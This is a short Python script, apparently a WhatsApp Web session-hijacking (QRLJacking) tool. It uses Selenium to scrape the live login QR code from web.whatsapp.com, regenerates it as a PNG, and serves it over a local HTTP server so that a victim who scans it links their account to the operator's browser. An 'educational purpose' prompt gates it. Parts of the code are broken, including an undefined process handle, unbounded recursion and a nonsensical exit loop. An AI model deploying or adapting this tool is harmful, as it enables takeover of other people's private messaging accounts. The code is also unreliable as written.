from selenium import webdriver
from bs4 import BeautifulSoup
import pyqrcode
import time
import subprocess
from subprocess import Popen, PIPE


def create_server(n):
    if n==1:
        f = Popen(['python','-m', 'http.server','8000'])
        print("server created")
    elif n==0:
        Popen.kill(f)

count = 1
def fun(count):
    try:
        p = driver.page_source.encode('utf-8')
        soup = BeautifulSoup(p,'html.parser')
        s = soup.find('div',class_='_1QMFu')['data-ref']
        if len(s)>0:
            url = pyqrcode.create(s) 
            url.png('myqr.png', scale = 6) 
        
        time.sleep(5)
        count+=1
        if count == 15:
            driver.refresh()
            count = 1
        fun(count)
    except:
        fun(count)
        


i = input(''' TYPE "AGREE"
TO CONFIRM TO USE THIS TOOL ONLY FOR EDUCAIONAL PURPOSE ''')
if i=="AGREE":
    driver =  webdriver.Chrome()
    driver.get('https://web.whatsapp.com/')
    create_server(1)
    print('Cntrl + c to exit')
    fun(count)

while KeyboardInterrupt:
    create_server(0)

